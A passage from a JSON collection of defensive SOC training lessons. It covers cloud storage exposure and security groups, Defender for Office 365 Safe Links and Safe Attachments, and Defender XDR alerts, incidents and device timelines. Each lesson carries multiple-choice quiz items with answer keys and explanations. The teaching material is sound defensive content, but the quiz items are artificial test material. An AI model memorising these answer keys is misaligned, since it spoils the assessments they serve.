      "explanation": "StopLogging turns off CloudTrail so the attacker's subsequent management-plane actions leave no trail — a classic Impair Defenses move — and because the disabling action is itself recorded, it should be a top-priority alert. Option a invents a daily-restart requirement that does not exist. Option c fabricates self-encryption. Option d is false: many identities could call StopLogging if over-permissioned, and the context (enumeration first) points to abuse, not a routine audit."
    },
    {
      "question": "You want to determine exactly which individual objects an attacker read out of an S3 bucket during an incident last week, but you can only find management-plane records of bucket policy changes. What is the most likely reason, and what does it teach about cloud logging?",
      "options": [
        {
          "label": "Object reads are management-plane events that CloudTrail always captures, so the data must have been deleted by the attacker to hide the reads.",
          "value": "a"
        },
        {
          "label": "Reading individual objects is data-plane activity, which is high-volume and often must be enabled beforehand, so without it that visibility was never recorded.",
          "value": "b"
        },
        {
          "label": "S3 never logs any access at all, so the only way to know which objects were read is to ask the attacker or reconstruct it from network packets.",
          "value": "c"
        },
        {
          "label": "The management-plane log automatically includes every object read, so the missing records simply mean the incident never actually involved that bucket.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Reading individual objects is data-plane activity, which is far higher volume than management events and frequently must be explicitly enabled (S3 object-level data events); if it was not turned on before the incident, that visibility does not exist. This teaches that data-plane coverage is a decision to make in advance for sensitive resources. Options a and d wrongly claim object reads are management-plane events. Option c overstates the gap — S3 data events can be logged when enabled."
    }
  ],
  "references": [
    "https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-user-guide.html",
    "https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log",
    "https://attack.mitre.org/techniques/T1562/008/"
  ],
  "xp": 210,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-cloud-storage-permissions-security-groups",
  "slug": "cloud-storage-permissions-and-security-groups",
  "title": "Cloud Exposure: Storage Permissions & Security Groups",
  "topic": "Cloud Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Two of the most common and most damaging cloud mistakes share a single root cause: a setting that should have been private was left open to the internet. A storage bucket exposed to the public has spilled billions of records across the industry, and a firewall rule opened to the whole world invites attackers straight to a server's door. This lesson covers the two exposure surfaces every cloud SOC watches — storage permissions and security groups — how they are supposed to work, how they go wrong, and how an analyst detects and responds to dangerous exposure.",
  "sections": [
    {
      "heading": "How Cloud Storage Permissions Work",
      "content": "Cloud **object storage** — AWS **S3** and Azure **Blob Storage** — holds files (called **objects** or **blobs**) inside containers (S3 **buckets** or Azure **containers**). It is cheap, effectively limitless, and reachable over the internet, which is exactly why a permission mistake here is so consequential: the data is one setting away from being globally readable.\n\nAccess to storage is controlled by several layered mechanisms, and understanding the layers explains how exposure happens:\n\n- **Private by default.** New buckets and containers are private; only the owning account can access them until someone grants more.\n- **Resource policies (bucket policies)** are JSON rules attached to the bucket that say who may do what. A policy that grants read to **everyone** (in AWS, the special principal `\"*\"` or the `AllUsers` group) makes the bucket public.\n- **ACLs (access control lists)** are an older, per-object or per-bucket grant mechanism that can also open access, sometimes surprisingly.\n- **Guardrails** like AWS **Block Public Access** and Azure's storage-account public-access settings are account- or bucket-level switches designed to prevent public exposure regardless of individual policies. When enabled they are a strong safety net; when disabled, the other settings can expose data.\n- **Pre-signed URLs / SAS tokens** grant temporary, scoped access to a specific object without making the whole bucket public — the correct way to share a single file.\n\nExposure happens when these layers combine to allow anonymous access: a bucket policy or ACL grants `AllUsers` read, and Block Public Access is off. The result is that **anyone on the internet, with no credential at all, can list and download the contents.** Countless breaches — customer records, backups, internal documents — have come not from a clever exploit but from exactly this misconfiguration. The data was not stolen through a broken lock; the door was simply left open, and a scanner walking the internet found it.\n\nThe defensive baseline is straightforward: keep buckets private, keep **Block Public Access** (or the Azure equivalent) enabled, share individual files with **pre-signed URLs / SAS tokens** rather than public settings, and apply least privilege to who can even change these settings."
    },
    {
      "heading": "Security Groups — The Cloud Firewall",
      "content": "Where storage permissions control access to *data*, **security groups** control network access to *resources* like virtual machines. A **security group** in AWS (and a **Network Security Group, or NSG**, in Azure) is a virtual firewall wrapped around a resource, defining which network traffic may reach it and, sometimes, leave it.\n\nThe core mechanics:\n\n- A security group holds **rules** that permit traffic based on **protocol**, **port**, and **source** (or destination). For example, \"allow TCP port 443 from anywhere\" lets the world reach a web server, while \"allow TCP port 22 from the office IP only\" restricts SSH to your network.\n- AWS security groups are **stateful** (if you allow a request in, the reply is automatically allowed out) and contain **only allow rules** — anything not explicitly allowed is denied. Azure NSGs use both allow and deny rules with priorities.\n- The critical, dangerous value is the source **`0.0.0.0/0`**, which means **the entire internet**. A rule allowing a port from `0.0.0.0/0` exposes that service to every attacker and scanner on earth.\n\nThe classic misconfiguration is opening a **management or database port to the whole internet**:\n\n- **SSH (port 22)** or **RDP (port 3389)** open to `0.0.0.0/0` invites brute-force and exploitation of the remote-access service; automated bots find such hosts within minutes.\n- **Database ports** — for example MySQL `3306`, MS SQL `1433`, MongoDB `27017`, Redis `6379`, Elasticsearch `9200` — exposed to the internet have led to enormous data breaches and ransom attacks, because many databases historically shipped with weak or no authentication.\n\nThe principle behind safe security groups is **least exposure**: open only the specific ports that must be reachable, from the **narrowest possible source** (a specific IP range, not the world), and keep administrative access behind a VPN, bastion host, or an identity-aware access service rather than exposing it directly. Egress (outbound) rules matter too — restricting where a compromised host can send data limits exfiltration. A security group is, in effect, the answer to \"who on the network is allowed to knock on this resource's door,\" and every `0.0.0.0/0` on a sensitive port answers \"everyone.\""
    },
    {
      "heading": "Detecting Dangerous Exposure",
      "content": "Because exposure is a *configuration* problem, detection blends two approaches: catching a bad state that already exists (**posture**), and catching the *moment* it is created (**change events**). A strong cloud SOC does both.\n\n**Posture detection — find what is already exposed.** Continuously assess configuration against safe baselines:\n\n- **Public storage:** buckets or containers with policies/ACLs granting anonymous or `AllUsers` access, or with Block Public Access disabled.\n- **Open security groups:** rules allowing sensitive ports (22, 3389, database ports) from `0.0.0.0/0`.\n\nCloud-native tools do much of this automatically. AWS **Config**, **Trusted Advisor**, **Security Hub**, and **Macie** (for sensitive data in S3), and Azure **Defender for Cloud**'s secure-score and recommendations, flag public buckets and overly open security groups. **GuardDuty** and Defender can also alert when a resource is *accessed* from the internet in suspicious ways. These are excellent, but they only help if someone acts on the findings — unactioned posture alerts are a common gap.\n\n**Change detection — catch the moment of exposure.** In the activity log (from the previous lesson), specific API calls signal that exposure was just introduced or widened:\n\n- **Storage:** `PutBucketPolicy`, `PutBucketAcl`, `PutBucketPublicAccessBlock` (especially turning it *off*), and the Azure equivalents changing container public access.\n- **Network:** `AuthorizeSecurityGroupIngress` (adding an inbound rule), particularly one whose source is `0.0.0.0/0` on a sensitive port; in Azure, NSG rule changes.\n\nAlerting on these change events — *who* opened *what*, from *where* — lets you catch a mistake or an attacker in the act, rather than discovering the open door days later. Correlate with identity: a rule opening RDP to the world, created by an unfamiliar identity from a foreign IP, is very different from a documented change by your platform team.\n\n**Respond by closing and confirming.** When you find dangerous exposure: **make the bucket private / re-enable Block Public Access**, or **remove the over-broad security-group rule and replace it with a scoped source**. Then assess impact — if a bucket was public, determine what data it held and for how long, and check access logs (if enabled) for who reached it; if a port was open, hunt the host for signs of compromise such as brute-force success or unexpected processes. Finally, feed the fix back into prevention: enable the guardrail (Block Public Access, an SCP or Azure Policy forbidding `0.0.0.0/0` on admin ports) so the same mistake cannot recur, and pair every guardrail with an alert on attempts to violate it."
    }
  ],
  "keyTakeaways": [
    "Cloud object storage (S3 buckets / Azure Blob containers) is private by default but can be exposed to the entire internet by a bucket policy or ACL granting AllUsers/anonymous access with Block Public Access off — the root cause of countless data-spill breaches.",
    "Security groups (AWS) and NSGs (Azure) are the cloud firewall; the dangerous value is source 0.0.0.0/0 (the whole internet), and opening SSH (22), RDP (3389), or database ports (3306/1433/27017/6379/9200) to it invites brute-force and mass breaches.",
    "Detect exposure two ways: posture tools (AWS Config/Security Hub/Macie, Azure Defender for Cloud) find what is already open, and activity-log change events (PutBucketPolicy, PutBucketPublicAccessBlock off, AuthorizeSecurityGroupIngress from 0.0.0.0/0) catch the moment exposure is created.",
    "Defend with least exposure: keep storage private with Block Public Access enabled and share via pre-signed URLs/SAS tokens; open only necessary ports from the narrowest source, keep admin access behind VPN/bastion; and enforce guardrails (SCP/Azure Policy) with alerts on violations."
  ],
  "quiz": [
    {
      "question": "A security review finds an S3 bucket containing customer records that anyone on the internet can list and download without any credentials. Which combination of settings most directly produces this dangerous public exposure?",
      "options": [
        {
          "label": "The bucket is in an unused AWS region, which automatically makes all objects readable by anonymous users across the public internet by default.",
          "value": "a"
        },
        {
          "label": "A bucket policy or ACL grants read to everyone (AllUsers / principal *) while Block Public Access is disabled, so anonymous internet users can access it.",
          "value": "b"
        },
        {
          "label": "The bucket uses pre-signed URLs, which by design make every object permanently and publicly downloadable to anyone who visits the storage endpoint.",
          "value": "c"
        },
        {
          "label": "The bucket owner enabled Block Public Access, which in AWS is the setting that grants the AllUsers group full read access to the contents.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Public exposure happens when a bucket policy or ACL grants read to everyone (AllUsers / the * principal) and the Block Public Access guardrail is off, letting anonymous internet users list and download objects. Option a is wrong because region does not control public access. Option c misdescribes pre-signed URLs, which grant temporary, scoped access to a single object rather than making everything public. Option d inverts reality — Block Public Access prevents public exposure, it does not grant it."
    },
    {
      "question": "In the activity log you see an AuthorizeSecurityGroupIngress call adding an inbound rule that allows TCP port 3389 from 0.0.0.0/0, made by an unfamiliar identity from a foreign IP. Why is this a high-priority finding?",
      "options": [
        {
          "label": "It is low priority, because 0.0.0.0/0 restricts access to a single trusted address and port 3389 is only ever used for encrypted internal backups.",
          "value": "a"
        },
        {
          "label": "It exposes RDP to the entire internet, inviting brute-force and exploitation, and the unfamiliar actor and origin suggest an attacker opening a way in.",
          "value": "b"
        },
        {
          "label": "It simply enables outbound web browsing from the host, so the only concern is potential data usage costs rather than any security exposure at all.",
          "value": "c"
        },
        {
          "label": "It automatically closes port 3389 to the internet, so the finding is merely a routine hardening action that needs no further investigation by the SOC.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Source 0.0.0.0/0 means the entire internet, and port 3389 is RDP; opening RDP to the world invites brute-force and exploitation, while the unfamiliar identity and foreign origin suggest an attacker creating an entry point — a high-priority finding. Option a misstates 0.0.0.0/0 as a single address and 3389 as backups. Option c wrongly frames an inbound RDP rule as outbound browsing. Option d reverses the effect: the rule opens the port, it does not close it."
    }
  ],
  "references": [
    "https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html",
    "https://docs.aws.amazon.com/vpc/latest/userguide/vpc-security-groups.html",
    "https://learn.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview"
  ],
  "xp": 210,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-defender-for-office-365-safe-links-attachments",
  "slug": "defender-for-office-365-safe-links-attachments",
  "title": "Defender for Office 365: Safe Links & Safe Attachments",
  "topic": "Microsoft Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Email is still the number-one way attackers get in, so the layer that inspects email before it reaches a user is one of the most important defences a Microsoft shop runs. Microsoft Defender for Office 365 (MDO) is that layer. It adds active protections on top of basic spam filtering: it detonates attachments in a sandbox, rewrites and re-checks links at the moment a user clicks, guards against impersonation, and can even reach into mailboxes to pull malicious mail back out after delivery. This lesson explains what MDO does, how Safe Attachments and Safe Links work, and how a SOC analyst reads the alerts and logs they produce.",
  "sections": [
    {
      "heading": "What Defender for Office 365 Protects Against",
      "content": "**Microsoft Defender for Office 365 (MDO)** is the email and collaboration security layer of Microsoft's stack. It protects **Exchange Online** email, and also **SharePoint**, **OneDrive**, and **Teams**, against the threats that basic anti-spam misses. Think of ordinary spam filtering as a bouncer who turns away obviously unwanted mail; MDO is the specialist team behind the bouncer that actually opens suspicious packages and follows suspicious links to see what they really do.\n\nThe threats MDO is built to stop map directly to how real attacks arrive:\n\n- **Malicious attachments** — a document or file that carries malware or a macro that downloads it. Signature-based scanning misses brand-new (zero-day) files, so MDO *detonates* them.\n- **Malicious URLs** — a link that leads to a credential-harvesting page or a malware download. Attackers often make the link benign at send time and weaponise it later, so MDO checks links *at click time*.\n- **Phishing and impersonation** — mail pretending to be a trusted brand, your own domain, or a specific executive (a lead-in to business email compromise).\n- **Post-delivery threats** — mail that looked clean on arrival but is later found malicious; MDO can retroactively remove it.\n\nMDO comes in two plans. **Plan 1** provides the real-time preventive controls — Safe Attachments, Safe Links, and anti-phishing. **Plan 2** adds the investigation and hunting tools — Threat Explorer, automated investigation and response, attack simulation training, and campaign views — that a SOC leans on.\n\nThe two flagship features, and the ones you must understand in depth, are **Safe Attachments** and **Safe Links**. Together they close the exact gap that signature filtering leaves open: the *unknown* attachment and the *time-delayed* link. The next two sections open each one up."
    },
    {
      "heading": "Safe Attachments — Detonating the Unknown",
      "content": "**Safe Attachments protects against malicious files by opening them in a secure, isolated environment before the recipient can — a technique called detonation or sandboxing.** The core problem it solves is the **zero-day** or never-before-seen file: traditional antivirus recognises known-bad files by signature, but an attacker who creates a brand-new malicious document has no signature yet, so signature scanning waves it through.\n\n**How it works, step by step:**\n\n1. An email arrives with an attachment. Ordinary anti-malware scanning runs first and catches known threats.\n2. If the file is unknown, Safe Attachments **opens it in a sandbox** — a disposable virtual machine isolated from the real network — and *watches what it does*. Does it try to download more code, modify the system, or reach out to a suspicious server? This behavioural analysis, called **detonation**, judges the file by its actions rather than its signature.\n3. Based on the verdict, the mail is delivered, blocked, or the attachment is stripped.\n\nBecause detonation takes a little time, MDO offers **Dynamic Delivery**: the email body is delivered immediately with a placeholder while the attachment finishes detonating in the background, so users are not left waiting. Safe Attachments policies can be set to **Block**, **Monitor**, or **Dynamic Delivery** modes, and equivalent protection covers files in **SharePoint, OneDrive, and Teams**.\n\n**Who does what, and when:** the *administrator* configures Safe Attachments policies once. Then, *every time* an email with an unknown attachment arrives (or a file lands in SharePoint/OneDrive/Teams), *MDO* detonates it and renders a verdict before — or, with Dynamic Delivery, in parallel with — delivery.\n\n**Why the SOC cares:** Safe Attachments verdicts are a rich signal. A detonation that flags a file as malicious tells you not just that a bad attachment was sent, but often *what it tried to do*, which helps you gauge intent and scope. In the logs (covered later), attachment verdicts appear in the email telemetry, and a wave of the same malicious attachment across many mailboxes is a campaign you should hunt and, if needed, purge."
    },
    {
      "heading": "Safe Links — Checking the Link at Click Time",
      "content": "**Safe Links protects against malicious URLs by checking them at the moment a user clicks, not just when the mail arrives.** This timing is the whole point. Attackers routinely send a link that points to a harmless page at delivery — so it passes inspection — and then swap the page for a phishing or malware site hours later, after the mail is safely in the inbox. A one-time scan at delivery cannot catch this **time-of-click** trick; Safe Links can.\n\n**How it works, step by step:**\n\n1. When mail is processed, MDO **rewrites** the URLs in the message so they point through a Microsoft checking service (you may notice links routed via a `safelinks.protection.outlook.com` address). The original destination is preserved inside.\n2. **At the moment the user clicks**, the click goes to Microsoft's service first, which checks the *current* reputation and verdict of the real destination in real time.\n3. If the destination is now known-malicious, the user sees a **warning/block page** instead of the harmful site. If it is safe, they are forwarded on transparently.\n\nSafe Links also covers URLs in **Teams** and in **Office apps**, and it works together with Safe Attachments (a link that leads to a file can trigger detonation). Administrators tune Safe Links policies — for example, whether to let users click through warnings.\n\n**Who does what, and when:** the *administrator* enables Safe Links policies. *MDO* rewrites links as mail is delivered. Then, *each time a user clicks*, the checking service evaluates the live destination and allows, warns, or blocks.\n\n**Why the SOC cares:** Safe Links generates one of the most valuable signals in phishing investigations — the **URL click event**. It records *who clicked what, and when, and what the verdict was*. If ten users received a phishing link but the logs show only two actually clicked — and one clicked *through* a warning — you instantly know who to prioritise for password resets and follow-up. This click-level visibility, combined with anti-phishing controls and **Zero-hour Auto Purge (ZAP)** — which retroactively removes mail later found malicious — is what turns MDO from a filter into an investigation tool."
    },
    {
      "heading": "Reading MDO Alerts and Logs",
      "content": "For a SOC analyst, MDO's value is the telemetry it produces, surfaced both as **alerts** in the Microsoft Defender portal and as **queryable events** in Advanced Hunting.\n\n**Alerts and the portal experience.** MDO raises alerts for events like a detected malware attachment, a user clicking a malicious URL, or a detected impersonation. These flow into the unified **Microsoft Defender portal** (security.microsoft.com) and correlate into **incidents** alongside endpoint and identity signals (covered in the Defender XDR lesson). With Plan 2, **Threat Explorer** lets you search all email by sender, subject, URL, or attachment and see delivery status and verdicts — invaluable for scoping a phishing campaign quickly.\n\n**The hunting tables.** In Advanced Hunting (its own lesson), MDO exposes a family of email tables that every analyst should recognise:\n\n- **EmailEvents** — one row per message: sender, recipient, subject, and the delivery action and threat verdicts.\n- **EmailAttachmentInfo** — details of attachments, including detonation results.\n- **EmailUrlInfo** — the URLs contained in messages.\n- **UrlClickEvents** — the Safe Links click records: who clicked, when, and whether it was allowed or blocked.\n\nA typical phishing investigation stitches these together: start from an alert or a reported message, use **EmailEvents** to find every recipient of the same campaign, check **EmailAttachmentInfo**/**EmailUrlInfo** for the malicious payload, and pivot to **UrlClickEvents** to see who actually clicked. That last step separates *received* from *engaged* and drives your response priorities.\n\n**Response actions.** From the portal you can take direct action: **soft-delete or purge** malicious messages from all mailboxes (manually or via **ZAP**), **submit** messages to Microsoft for re-analysis, and, when integrated with the rest of Defender, trigger endpoint or identity responses for users who clicked. The workflow to internalise is: *alert or report → scope the campaign in Threat Explorer/EmailEvents → confirm the payload → identify who clicked in UrlClickEvents → purge the mail and remediate the affected users.* That loop — from a single suspicious email to full campaign containment — is exactly what MDO is designed to make fast."
    }
  ],
  "keyTakeaways": [
    "Defender for Office 365 (MDO) protects Exchange email plus SharePoint/OneDrive/Teams against malicious attachments, malicious URLs, impersonation/phishing, and post-delivery threats — going beyond signature-based spam filtering.",
    "Safe Attachments detonates unknown files in an isolated sandbox and judges them by behaviour (catching zero-day files signatures miss), with Dynamic Delivery sending the body immediately while the attachment finishes detonating.",
    "Safe Links rewrites URLs and checks them at time-of-click, defeating the trick of a link that is benign at delivery and weaponised later; it produces the high-value UrlClickEvents record of who clicked what and when.",
    "Analysts investigate in the Defender portal (alerts, incidents, Threat Explorer) and Advanced Hunting tables (EmailEvents, EmailAttachmentInfo, EmailUrlInfo, UrlClickEvents), then contain with purge/ZAP — moving from one reported email to full campaign scoping and remediation."
  ],
  "quiz": [
    {
      "question": "A phishing email contains a link that pointed to a harmless page when it was delivered on Monday, but the attacker replaced that page with a credential-harvesting site on Tuesday. How does Safe Links protect a user who clicks the link on Tuesday, and why does a one-time delivery scan fail here?",
      "options": [
        {
          "label": "Safe Links deletes every email that contains any URL on arrival, so the malicious message was already removed before the user could ever click it.",
          "value": "a"
        },
        {
          "label": "Safe Links rewrites the URL and checks the live destination at click time, so it catches the now-malicious site that a one-time delivery-time scan would have missed.",
          "value": "b"
        },
        {
          "label": "Safe Links permanently blocks the user's browser from opening any external website, which is why no phishing page can ever load after an email is received.",
          "value": "c"
        },
        {
          "label": "Safe Links scans the link only once when the mail arrives, so on Tuesday it relies entirely on the user noticing the page looks suspicious before entering credentials.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Safe Links rewrites URLs so a click is checked against the destination's live reputation at click time, which catches a link that was benign at delivery but weaponised later — exactly the time-of-click trick a single delivery-time scan cannot stop. Option a is wrong because Safe Links does not delete all mail containing URLs. Option c invents a total browser block that does not exist. Option d describes the very failure mode Safe Links is designed to overcome, not how it works."
    },
    {
      "question": "During a phishing investigation you confirm 40 users received the same malicious link. Which Microsoft Defender for Office 365 data source best tells you which of those users actually clicked it, so you can prioritise password resets?",
      "options": [
        {
          "label": "The DeviceProcessEvents table, because it records every process launched on endpoints and therefore lists which users opened the phishing email in Outlook.",
          "value": "a"
        },
        {
          "label": "The UrlClickEvents table, because Safe Links records who clicked which URL and when, and whether the click was allowed or blocked.",
          "value": "b"
        },
        {
          "label": "The Azure Activity Log, because it captures all management-plane API calls and therefore includes every email link a user chose to open.",
          "value": "c"
        },
        {
          "label": "The Safe Attachments detonation report, because sandbox analysis of the attachment reveals the full list of recipients who later clicked the message's link.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "UrlClickEvents is the Safe Links click record: it captures who clicked which URL, when, and the verdict, which is exactly what you need to separate users who merely received the link from those who engaged with it. DeviceProcessEvents tracks endpoint processes, not email clicks. The Azure Activity Log records cloud management API calls, not email link clicks. Safe Attachments detonates files and does not track who clicked a link."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/defender-office-365/mdo-about",
    "https://learn.microsoft.com/en-us/defender-office-365/safe-attachments-about",
    "https://learn.microsoft.com/en-us/defender-office-365/safe-links-about"
  ],
  "xp": 210,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-defender-xdr-alerts-incidents-timeline",
  "slug": "defender-xdr-alerts-incidents-device-timeline",
  "title": "Microsoft Defender XDR: Alerts, Incidents & Device Timeline",
  "topic": "Microsoft Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "A single attack rarely trips just one sensor. The same intrusion might raise an endpoint alert when malware runs, an identity alert when a stolen account signs in, and an email alert for the phishing message that started it. Microsoft Defender XDR exists to stitch those separate signals into one coherent story. This lesson explains how the unified Defender portal turns raw alerts into correlated incidents, how to read an incident's attack story, and how the device timeline lets you reconstruct exactly what happened on a machine — the core triage skills for anyone working in a Microsoft environment.",
  "sections": [
    {
      "heading": "One Portal, Many Sensors",
      "content": "**Microsoft Defender XDR** (extended detection and response) is the umbrella that brings Microsoft's individual security products together into a single investigation experience at **security.microsoft.com**, the **Microsoft Defender portal**. The word *extended* is the key idea: instead of each product having its own separate console and its own separate alerts, XDR correlates signals *across* them.\n\nThe main sensors feeding into it are:\n\n- **Microsoft Defender for Endpoint (MDE)** — the EDR on laptops and servers; sees processes, files, network connections, and registry changes.\n- **Microsoft Defender for Office 365 (MDO)** — email and collaboration; sees phishing, malicious attachments, and link clicks.\n- **Microsoft Defender for Identity (MDI)** — on-premises Active Directory signals; sees credential attacks like Kerberoasting and lateral movement.\n- **Microsoft Defender for Cloud Apps (MDCA)** — cloud app activity and shadow IT.\n- **Microsoft Entra ID Protection** — risky sign-ins and risky users.\n\nEach sensor watches a different slice of the environment. On their own, they produce a flood of individual alerts that an analyst would otherwise triage one by one, with no built-in sense of which belong together. XDR's job is to change that: it treats the whole estate as one system and asks, \"which of these alerts are actually the same attack?\"\n\nThe practical payoff is enormous. An analyst working in the unified portal sees a phishing email, the endpoint it detonated on, and the account that was subsequently misused as parts of *one* case, not three disconnected tickets. That is the difference between drowning in alerts and understanding an attack. The next sections break down the two building blocks of that experience — the **alert** (a single detection) and the **incident** (the correlated story) — and then the **device timeline** that lets you zoom all the way in on one machine."
    },
    {
      "heading": "Alerts — A Single Detection",
      "content": "An **alert** is the atomic unit of detection: one signal that something suspicious or malicious happened. When MDE sees a known-bad process launch, when MDO detonates a malicious attachment, or when Identity Protection scores a sign-in as high risk, each raises an alert.\n\nEvery alert carries a consistent set of information an analyst reads to triage it:\n\n- **Title and category** — what was detected and where it fits (for example, a category aligned to a MITRE ATT&CK tactic like *Credential Access* or *Lateral Movement*).\n- **Severity** — Informational, Low, Medium, or High — a first cut at how urgent it is.\n- **Status** — New, In Progress, or Resolved, and a **classification** (true positive, false positive, benign) that the analyst sets when closing it.\n- **The entities involved** — the device, user, file, IP, or mailbox the alert concerns. These entities are what let alerts be linked together.\n- **The detection source** — which Defender product raised it.\n\nThe critical thing to understand is that **an alert is a fragment, not the whole picture.** A single \"suspicious PowerShell\" alert might be an admin script or the middle of a live intrusion — the alert alone cannot tell you. Triaging alerts purely one at a time is how analysts burn out and miss real attacks: high alert volume plus no correlation means the important signal hides in the noise.\n\nThis is exactly the problem incidents solve. Because each alert names its **entities** (this device, that user, this file hash), Defender can notice when many alerts share entities or fit a known attack sequence and group them. So while you *can* look at the raw alert queue, the modern Defender workflow is to work at the **incident** level, where those fragments are already assembled into something you can reason about. The next section explains how that assembly works and what an incident gives you that a pile of alerts never could."
    },
    {
      "heading": "Incidents — The Correlated Attack Story",
      "content": "An **incident** is a collection of related alerts that Defender has automatically grouped because they appear to be part of the **same attack**. This is the heart of XDR and the level at which real investigation happens.\n\n**How correlation works.** Defender links alerts that share **entities** (the same device, user, file, or IP) or that fit a recognised **attack sequence** across products. So a phishing email (MDO alert), the malware it dropped when opened (MDE alert), and the account misuse that followed (Identity alert) collapse into a single incident, because they are connected by the user and device involved. Instead of three tickets in three consoles, the analyst gets one case that already tells the story end to end.\n\n**What an incident gives you:**\n\n- **The attack story / graph** — a visual and narrative map of what happened, in what order, across email, endpoint, and identity. This is often the fastest way to grasp scope.\n- **All involved assets** — every device, user, and mailbox touched, so you can see how far the attack spread.\n- **Consolidated evidence and entities** — the files, processes, IPs, and URLs gathered from all the member alerts in one place.\n- **A severity for the whole incident**, aggregated from its alerts, so the queue can be prioritised as *cases*, not fragments.\n\n**The triage workflow.** A mature Defender SOC works the **incident queue**, not the raw alert firehose. For each incident you: read the attack story to understand what happened; check the scope (which users and devices); confirm whether it is a true positive; contain (isolate a device, disable or reset an account, purge mail); and classify and close, feeding the outcome back to improve detections. Automated investigation and response (AIR) can even perform some of these steps for you and attach its findings to the incident.\n\nThe mental shift to make is this: **alerts are evidence; the incident is the case.** Working at the incident level is what lets one analyst understand a multi-stage, multi-product attack quickly — and it is only possible because each underlying alert named its entities clearly enough to be correlated. When you need to go deeper on one machine within that case, you drop into the device timeline."
    },
    {
      "heading": "Device Timeline — Reconstructing What Happened on a Machine",
      "content": "When an incident points at a specific device, the **device timeline** in Microsoft Defender for Endpoint lets you reconstruct, in chronological order, exactly what that machine did. It is the microscope you reach for after the incident graph has shown you *which* device to examine.\n\n**What the timeline shows.** For a given device, MDE continuously records rich behavioural telemetry and presents it as a time-ordered stream of events:\n\n- **Process events** — what programs ran, their command lines, and crucially their **parent-child relationships** (which process launched which).\n- **File events** — files created, modified, or deleted.\n- **Network events** — connections the device made and to where.\n- **Registry and logon events** — configuration changes and sign-ins.\n\nBecause these are laid out on a single timeline, you can start from a known bad moment — say, the instant an alert fired — and scroll **backwards** to see what led up to it and **forwards** to see what followed. This is how you answer the questions that matter in an investigation: *How did this get here? What did it do next? Did it spread?*\n\n**A worked pattern.** Suppose an incident flags a malicious file on a laptop. In the timeline you find the moment the file was written, then walk back to see the **process tree**: a Word document spawned PowerShell, which downloaded and ran the file. That parent-child chain reveals the *initial access* (a malicious document, i.e. phishing) and the *execution* method — far more than the single \"malicious file\" alert told you. Walking forward, you see whether the file then made network connections or touched other files, revealing command-and-control or further activity.\n\n**Why it matters for the SOC.** The timeline is where root-cause analysis actually happens. The incident tells you *that* a device was involved and roughly how; the timeline tells you the precise *sequence* — the patient-zero action, the execution chain, and the blast radius. It also feeds your response: knowing exactly what ran and what it touched tells you whether isolating the device is enough or whether you must hunt the same pattern on other machines (a job for Advanced Hunting, the next lesson). In short: incidents give you the story, and the device timeline gives you the frame-by-frame proof."
    }
  ],
  "keyTakeaways": [
    "Microsoft Defender XDR unifies signals from MDE (endpoint), MDO (email), MDI (identity/AD), MDCA (cloud apps), and Entra ID Protection into one portal (security.microsoft.com), correlating across products rather than siloing alerts.",
    "An alert is a single detection (title, severity, status, entities, source) and is only a fragment; triaging alerts one at a time in isolation is how real attacks hide in the noise.",
    "An incident automatically groups related alerts that share entities or fit an attack sequence into one case, providing the attack story/graph, all involved assets, and consolidated evidence — so mature SOCs work the incident queue, not the raw alert firehose.",
    "The MDE device timeline reconstructs a machine's events chronologically (process trees, file/network/registry/logon), letting you walk backward to root cause and forward to blast radius — turning a single alert into a full execution chain."
  ],
  "quiz": [
    {
      "question": "In Microsoft Defender XDR, what fundamentally distinguishes an 'incident' from an 'alert', and why does working at the incident level matter for a SOC analyst?",
      "options": [
        {
          "label": "An incident is a lower-severity version of an alert, so analysts work the alert queue first and only review incidents when they have spare time between cases.",
          "value": "a"
        },
        {
          "label": "An incident is a collection of related alerts auto-grouped as one attack, giving the correlated story and scope that individual alert fragments cannot provide on their own.",
          "value": "b"
        },
        {
          "label": "An incident is a single detection from one product, while an alert always spans several products, so alerts are the broader and more useful unit to triage.",
          "value": "c"
        },
        {
          "label": "An incident and an alert are identical in Defender; the two words are interchangeable labels for the same object shown in different parts of the portal.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "An incident is a set of related alerts that Defender automatically correlates (by shared entities or attack sequence) into one case, providing the end-to-end attack story and scope that isolated alerts cannot, which is why mature SOCs triage at the incident level. Option a inverts severity and workflow. Option c reverses the definitions — the alert is the single detection, not the incident. Option d is false because the two are distinct objects."
    },
    {
      "question": "An incident flags a malicious executable on a laptop. You open the device timeline and want to determine how the file got there. Which capability of the timeline most directly reveals the root cause?",
      "options": [
        {
          "label": "The alert severity score, because a High rating on the timeline automatically identifies which phishing email delivered the file to the device.",
          "value": "a"
        },
        {
          "label": "The chronological process tree showing parent-child relationships, letting you walk back to see, for example, a Word document spawning PowerShell that fetched the file.",
          "value": "b"
        },
        {
          "label": "The incident's aggregated severity, because summing the severities of all member alerts pinpoints the exact process that first wrote the malicious file to disk.",
          "value": "c"
        },
        {
          "label": "The list of other devices in the incident, because comparing device names alone reveals which machine originally created and distributed the executable.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The device timeline records events chronologically with process parent-child relationships, so you can walk backward from the malicious file to the process tree that produced it — for example a Word document spawning PowerShell that downloaded it — revealing initial access and execution. Option a is wrong because a severity score does not identify a delivery email. Options c and d describe aggregated severity and device lists, which do not reconstruct the on-device execution chain that the timeline's process tree provides."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/defender-xdr/microsoft-365-defender",
